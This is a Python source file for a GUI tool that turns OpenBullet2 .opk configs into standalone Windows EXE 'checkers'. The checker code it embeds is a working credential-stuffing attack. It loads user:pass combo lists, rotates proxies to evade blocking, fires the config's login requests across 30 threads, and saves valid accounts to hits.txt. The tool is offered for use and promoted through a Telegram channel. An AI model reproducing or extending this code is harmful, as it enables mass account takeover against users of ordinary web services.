# OB2 EXE Compiler by Yashvir Gaming - Premium Edition
import tkinter as tk
from concurrent.futures import ThreadPoolExecutor, as_completed
from tkinter import filedialog, messagebox, ttk, scrolledtext
import zipfile, os, subprocess, re, threading, shutil, time, sys
from colorama import Fore, Style, init as colorama_init
from playsound import playsound

colorama_init(autoreset=True)

HIT_SOUND = "hit.wav"  # Make sure it's in the same folder as this script

def extract_script_loli(opk_path):
    with zipfile.ZipFile(opk_path, 'r') as zip_ref:
        if 'script.loli' in zip_ref.namelist():
            with zip_ref.open('script.loli') as f:
                return f.read().decode('utf-8')
    return None

def parse_blocks(script_loli):
    blocks = []
    block_re = re.compile(r'BLOCK:(.*?)\n(.*?)ENDBLOCK', re.DOTALL)
    for match in block_re.finditer(script_loli):
        block_type = match.group(1).strip()
        block_body = match.group(2).strip()
        lines = [line.strip() for line in block_body.split('\n') if line.strip()]
        params = {}
        assign_var = None
        label = None
        for line in lines:
            if line.startswith('=> VAR '):
                assign_var = line.split('=> VAR ')[1].strip()
            elif line.startswith('LABEL:'):
                label = line.split('LABEL:')[1].strip()
                params['label'] = label
            elif '=' in line:
                k, v = line.split('=', 1)
                params[k.strip()] = v.strip().strip('"')
        blocks.append({
            'type': block_type,
            'params': params,
            'assign_var': assign_var,
            'label': label,
            'lines': lines
        })
    return blocks

def generate_checker_python(blocks, exe_name):
    # Insert watermark and sound for hit!
    checker_code = f'''# Standalone Checker generated by OB2 EXE Compiler by Yashvir Gaming
# Watermark: Coded by Yashvir Gaming

import zipfile, re, random, string, urllib.parse, httpx, os, sys
from colorama import Fore, Style, init as colorama_init
from playsound import playsound
from concurrent.futures import ThreadPoolExecutor, as_completed

colorama_init(autoreset=True)
HIT_SOUND = "{HIT_SOUND}"

def play_hit():
    try:
        playsound(HIT_SOUND)
    except Exception: pass

def load_lines(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def parse_proxy(line):
    parts = line.split(':')
    if len(parts) == 2:
        return f"http://{{line}}"
    elif len(parts) == 4:
        return f"http://{{parts[2]}}:{{parts[3]}}@{{parts[0]}}:{{parts[1]}}"
    return None

def run_blocks(blocks, combo, proxies):
    context = {{}}
    context['@input.USER'], context['@input.PASS'] = combo.split(':', 1)
    last_response = None
    for block in blocks:
        t = block['type']
        p = block['params']
        var = block['assign_var']

        if t == 'RandomString':
            pattern = p['input']
            def randchar(token):
                if token == '?u':
                    return random.choice(string.ascii_uppercase)
                if token == '?d':
                    return random.choice(string.digits)
                return token
            parts = re.findall(r'\\?u|\\?d|.', pattern)
            out = ''.join(randchar(token) for token in parts)
            if var:
                context[var] = out

        elif t == 'UrlEncode':
            value = context.get(p['input'], p['input'])
            result = urllib.parse.quote_plus(value)
            if var:
                context[var] = result

        elif t == 'Unescape':
            value = context.get(p['input'], p['input'])
            result = bytes(value, "utf-8").decode("unicode_escape")
            if var:
                context[var] = result

        elif t == 'Parse':
            inp = context.get(p['input'], p['input'])
            left = p.get('leftDelim')
            right = p.get('rightDelim')
            mode = p.get('MODE', 'LR')
            out = ""
            if mode == 'LR' and left and right:
                l = inp.find(left)
                if l != -1:
                    l += len(left)
                    r = inp.find(right, l)
                    if r != -1:
                        out = inp[l:r]
            if var:
                context[var] = out

        elif t == 'HttpRequest':
            url = p['url']
            method = p.get('method', 'GET')
            headers = {{}}
            if 'customHeaders' in p:
                hdrs = re.findall(r'\("([^"]+)", "([^"]+)"\)', p['customHeaders'])
                headers = {{k: v for k, v in hdrs}}
            data = p.get('data', '')
            def replace_vars(text):
                if not isinstance(text, str): return text
                for k, v in context.items():
                    if isinstance(v, str):
                        text = text.replace(k, v)
                return text
            url = replace_vars(url)
            data = replace_vars(data)
            headers = {{hk: replace_vars(hv) for hk, hv in headers.items()}}
            proxy = proxies[random.randint(0, len(proxies)-1)] if proxies else None

            # --- AutoRedirect support (works for both True and False) ---
            follow_redirects = True
            if 'autoRedirect' in p and str(p['autoRedirect']).lower() == 'false':
                follow_redirects = False

            try:
                resp = httpx.request(
                    method, url, headers=headers, data=data,
                    proxies={{"http://": proxy, "https://": proxy}} if proxy else None,
                    timeout=20,
                    follow_redirects=follow_redirects
                )
                last_response = resp
                context['@data.SOURCE'] = resp.text
                context['@data.RESPONSECODE'] = str(resp.status_code)
            except Exception as e:
                context['@data.SOURCE'] = str(e)
                context['@data.RESPONSECODE'] = "000"

        elif t == 'Keycheck':
            context['@last_keycheck'] = block
    return context, last_response

def process_keycheck(context):
    block = context.get('@last_keycheck')
    if not block:
        return None
    source = context.get('@data.SOURCE', '')
    code = context.get('@data.RESPONSECODE', '')
    result = "CUSTOM"
    for line in block.get('lines', []):
        l = line.strip().upper()
        if 'SUCCESS' in l and 'CONTAINS' in l:
            value = line.split('"')[1]
            if value in source:
                return "HIT"
        elif 'FAIL' in l and 'CONTAINS' in l:
            value = line.split('"')[1]
            if value in source:
                return "FAIL"
        elif 'RETRY' in l and 'DOESNOTCONTAIN' in l:
            value = line.split('"')[1]
            if value not in code:
                return "RETRY"
        elif 'NOTEQUALTO' in l:
            value = line.split()[-1].replace('"','')
            try:
                if float(code) != float(value):
                    return "RETRY"
            except:
                continue
    return result

import shutil
from colorama import Fore, Style

def center_text(text, width=None):
    if width is None:
        try:
            width = shutil.get_terminal_size().columns
        except Exception:
            width = 80
    return "\n".join(line.center(width) for line in text.splitlines())

if __name__ == "__main__":
    ascii_art = """
██╗   ██╗ █████╗ ███████╗██╗  ██╗██╗   ██╗██╗██████╗      ██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗ 
╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║██║   ██║██║██╔══██╗    ██╔════╝ ██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ 
 ╚████╔╝ ███████║███████╗███████║██║   ██║██║██████╔╝    ██║  ███╗███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗
  ╚██╔╝  ██╔══██║╚════██║██╔══██║╚██╗ ██╔╝██║██╔══██╗    ██║   ██║██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
   ██║   ██║  ██║███████║██║  ██║ ╚████╔╝ ██║██║  ██║    ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
"""
    subtitle = "Telegram: https://t.me/OFFICIALYASHVIRGAMING"
    print(Fore.GREEN + ascii_art + Style.RESET_ALL + Fore.CYAN + center_text(subtitle) + Style.RESET_ALL)

    combo_file = input("Combo file: ").strip().strip('"')
    proxy_file = input("Proxy file (leave blank for no proxies): ").strip().strip('"')
    combos = load_lines(combo_file)
    proxies = [parse_proxy(p) for p in load_lines(proxy_file)] if proxy_file else []
    proxies = [p for p in proxies if p]
    blocks = {blocks}  # your blocks variable here


    # ---- Threaded Checker ----
    max_bots = 30  # Number of concurrent threads/bots

    results_count = {{"HIT": 0, "FAIL": 0, "RETRY": 0, "BAN": 0, "CUSTOM": 0, "INVALID": 0}}

    def check_combo(combo):
        if ':' not in combo:
            print(Fore.YELLOW + f"[INVALID] {{combo}}")
            return "INVALID"
        context, resp = run_blocks(blocks, combo, proxies)
        result = process_keycheck(context)
        if result == "HIT":
            print(Fore.GREEN + f"[HIT] {{combo}}")
            try:
                play_hit()
            except:
                pass
            with open("hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{{combo}}\\n")
            return "HIT"
        elif result == "FAIL":
            print(Fore.RED + f"[FAIL] {{combo}}")
            return "FAIL"
        elif result == "RETRY":
            print(Fore.MAGENTA + f"[RETRY] {{combo}}")
            return "RETRY"
        elif result == "BAN":
            print(Fore.MAGENTA + f"[BAN] {{combo}}")
            return "BAN"
        else:
            print(Fore.YELLOW + f"[CUSTOM] {{combo}}")
            return "CUSTOM"

    with ThreadPoolExecutor(max_workers=max_bots) as executor:
        futures = {{executor.submit(check_combo, combo): combo for combo in combos}}
        for future in as_completed(futures):
            try:
                res = future.result()
                if res in results_count:
                    results_count[res] += 1
            except Exception as e:
                print(Fore.RED + f"[ERROR] {{e}}")

    print(Style.BRIGHT + Fore.GREEN +
          f"\\nHits: {{results_count['HIT']}}  Fails: {{results_count['FAIL']}}  Custom: {{results_count['CUSTOM']}}  Retry: {{results_count['RETRY']}}  Ban: {{results_count['BAN']}}")
    input("Done. Press Enter to exit...")
'''

    checker_code = checker_code.replace('return "\n".join', 'return "\\n".join')
    checker_code = checker_code.replace("return '\n'.join", "return '\\n'.join")
    return checker_code

class OB2CompilerGUI:
    def __init__(self, root):
        self.root = root
        self.is_dark = False
        root.title("OB2 EXE Compiler by Yashvir Gaming")
        root.geometry("700x400")
        root.resizable(False, False)
        self.bg_light = "#f0f2f5"
        self.bg_dark = "#191c24"
        self.fg_light = "#191c24"
        self.fg_dark = "#e2e4e7"
        self.logo = tk.Label(root, text="🟦 OB2 EXE Compiler", font=("Segoe UI Black", 18), fg="#4267B2")
        self.logo.pack(pady=8)
        self.watermark = tk.Label(root, text="Coded by Yashvir Gaming", font=("Arial", 9), fg="gray")
        self.watermark.place(relx=1.0, y=10, anchor="ne")
        self.frame = tk.Frame(root, bg=self.bg_light)
        self.frame.pack(fill="both", expand=True, padx=24, pady=(0,14))
        self.file_entry = tk.Entry(self.frame, width=45, font=("Consolas", 10), state='readonly')
        self.file_entry.grid(row=0, column=0, columnspan=2, pady=10, sticky="ew")
        self.browse_btn = tk.Button(self.frame, text="Browse .opk", command=self.browse_file, font=("Arial", 10, "bold"))
        self.browse_btn.grid(row=0, column=2, padx=4, sticky="ew")
        self.theme_btn = tk.Button(self.frame, text="🌙", command=self.toggle_theme, width=2)
        self.theme_btn.grid(row=0, column=3, sticky="ew")
        self.summary_text = tk.Label(self.frame, text="No config loaded.", font=("Consolas", 10), anchor="w", bg=self.bg_light, fg=self.fg_light, justify="left")
        self.summary_text.grid(row=1, column=0, columnspan=4, sticky="w")
        self.compile_btn = tk.Button(self.frame, text="Convert to EXE", command=self.start_compile, font=("Arial", 12, "bold"), state='disabled')
        self.compile_btn.grid(row=2, column=0, pady=10, sticky="ew", columnspan=4)
        self.show_code_btn = tk.Button(self.frame, text="Show Script", command=self.show_script, state='disabled')
        self.show_code_btn.grid(row=3, column=0, sticky="ew")
        self.clear_output_btn = tk.Button(self.frame, text="Clear Output", command=self.clear_output)
        self.clear_output_btn.grid(row=3, column=1, sticky="ew")
        self.progress = ttk.Progressbar(self.frame, orient="horizontal", mode="determinate", length=400)
        self.progress.grid(row=4, column=0, columnspan=4, pady=10)
        self.status = tk.Label(self.frame, text="", font=("Consolas", 10), fg="green", bg=self.bg_light)
        self.status.grid(row=5, column=0, columnspan=4, sticky="w")
        self.open_folder_btn = tk.Button(self.frame, text="Open Output Folder", command=self.open_output, state="disabled")
        self.open_folder_btn.grid(row=6, column=0, pady=6, sticky="ew")
        self.run_exe_btn = tk.Button(self.frame, text="Run EXE", command=self.run_exe, state="disabled")
        self.run_exe_btn.grid(row=6, column=1, pady=6, sticky="ew")
        self.copy_path_btn = tk.Button(self.frame, text="Copy Path", command=self.copy_path, state="disabled")
        self.copy_path_btn.grid(row=6, column=2, pady=6, sticky="ew")
        self.about_btn = tk.Button(self.frame, text="About", command=self.show_about)
        self.about_btn.grid(row=6, column=3, pady=6, sticky="ew")
        self.selected_file = None
        self.generated_py = None
        self.generated_exe = None
        self.generated_code = None

    def browse_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("OPK Files", "*.opk")])
        if file_path:
            self.selected_file = file_path
            self.file_entry.config(state='normal')
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, file_path)
            self.file_entry.config(state='readonly')
            self.compile_btn.config(state='normal')
            self.show_code_btn.config(state='normal')
            blocks = parse_blocks(extract_script_loli(file_path))
            info = f"Config: {os.path.basename(file_path)}\\nBlocks: {len(blocks)}\\n"
            reqs = sum(1 for b in blocks if b['type'] == 'HttpRequest')
            keys = sum(1 for b in blocks if b['type'] == 'Keycheck')
            info += f"HTTP Requests: {reqs}\\nKeycheck Blocks: {keys}\\n"
            logic = ', '.join(set(b['type'] for b in blocks))
            info += f"Block Types: {logic}\\n"
            self.summary_text.config(text=info)
            self.status.config(text="Loaded config. Ready to compile.", fg="#4267B2")

    def start_compile(self):
        threading.Thread(target=self.compile_config, daemon=True).start()

    def compile_config(self):
        self.progress["value"] = 10
        self.status.config(text="Parsing config...", fg="blue")
        time.sleep(0.5)
        try:
            script_loli = extract_script_loli(self.selected_file)
            blocks = parse_blocks(script_loli)
            exe_name = os.path.splitext(os.path.basename(self.selected_file))[0].replace(" ", "_")
            checker_code = generate_checker_python(blocks, exe_name)
            self.generated_code = checker_code
            output_dir = os.path.abspath("output")
            os.makedirs(output_dir, exist_ok=True)
            py_file = os.path.join(output_dir, f"{exe_name}.py")
            exe_file = os.path.join(output_dir, f"{exe_name}.exe")
            self.generated_py = py_file
            self.generated_exe = exe_file
            with open(py_file, "w", encoding="utf-8") as f:
                f.write(checker_code)
            self.progress["value"] = 40
            self.status.config(text="Please wait... compiling your config into EXE! 🚀", fg="green")
            time.sleep(0.5)
            # Copy hit.wav to output
            if os.path.exists(HIT_SOUND):
                shutil.copy(HIT_SOUND, output_dir)
            icon_file = "ICON.ico"
            nuitka_cmd = [
                "python", "-m", "nuitka",
                "--standalone",
                "--onefile",
                "--assume-yes-for-downloads",
                "--output-dir=" + output_dir,
                "--show-progress",
                "--jobs=6",
                f"--windows-icon-from-ico={icon_file}",
                py_file
            ]
            subprocess.run(nuitka_cmd, check=True)
            self.progress["value"] = 100
            self.status.config(text=f"Success! {exe_name}.exe compiled.", fg="green")
            self.open_folder_btn.config(state="normal")
            self.run_exe_btn.config(state="normal")
            self.copy_path_btn.config(state="normal")
            playsound(HIT_SOUND)
            time.sleep(0.4)
        except Exception as e:
            self.status.config(text=f"Error: {e}", fg="red")
            self.progress["value"] = 0

    def show_script(self):
        if not self.generated_code:
            try:
                script_loli = extract_script_loli(self.selected_file)
                blocks = parse_blocks(script_loli)
                exe_name = os.path.splitext(os.path.basename(self.selected_file))[0].replace(" ", "_")
                checker_code = generate_checker_python(blocks, exe_name)
                self.generated_code = checker_code
            except:
                self.generated_code = "# Error generating code!"
        win = tk.Toplevel(self.root)
        win.title("Generated Checker Script")
        txt = scrolledtext.ScrolledText(win, width=120, height=38, font=("Consolas", 9))
        txt.pack(padx=8, pady=8)
        txt.insert(tk.END, self.generated_code)
        txt.configure(state="disabled")

    def open_output(self):
        output_dir = os.path.abspath("output")
        if os.name == "nt":
            os.startfile(output_dir)
        else:
            subprocess.run(["xdg-open", output_dir])

    def run_exe(self):
        if self.generated_exe and os.path.exists(self.generated_exe):
            if os.name == "nt":
                os.startfile(self.generated_exe)
            else:
                subprocess.run([self.generated_exe])

    def copy_path(self):
        if self.generated_exe and os.path.exists(self.generated_exe):
            self.root.clipboard_clear()
            self.root.clipboard_append(self.generated_exe)
            self.status.config(text="EXE path copied to clipboard!", fg="#4267B2")

    def clear_output(self):
        output_dir = os.path.abspath("output")
        for f in os.listdir(output_dir):
            try:
                os.remove(os.path.join(output_dir, f))
            except Exception:
                pass
        self.status.config(text="Output folder cleared.", fg="#4267B2")
        self.open_folder_btn.config(state="disabled")
        self.run_exe_btn.config(state="disabled")
        self.copy_path_btn.config(state="disabled")

    def show_about(self):
        messagebox.showinfo("About", "OB2 EXE Compiler\nPremium GUI Edition\n\nDeveloped by Yashvir Gaming\n\n- Browse any OpenBullet2 .opk\n- Converts to EXE checker!\n- Sound, progress, preview, dark mode and more.")

    def toggle_theme(self):
        self.is_dark = not self.is_dark
        bg = self.bg_dark if self.is_dark else self.bg_light
        fg = self.fg_dark if self.is_dark else self.fg_light
        self.frame.config(bg=bg)
        self.summary_text.config(bg=bg, fg=fg)
        self.status.config(bg=bg, fg=fg)
        self.logo.config(fg="#FFD700" if self.is_dark else "#4267B2")

if __name__ == "__main__":
    root = tk.Tk()
    app = OB2CompilerGUI(root)
    root.mainloop()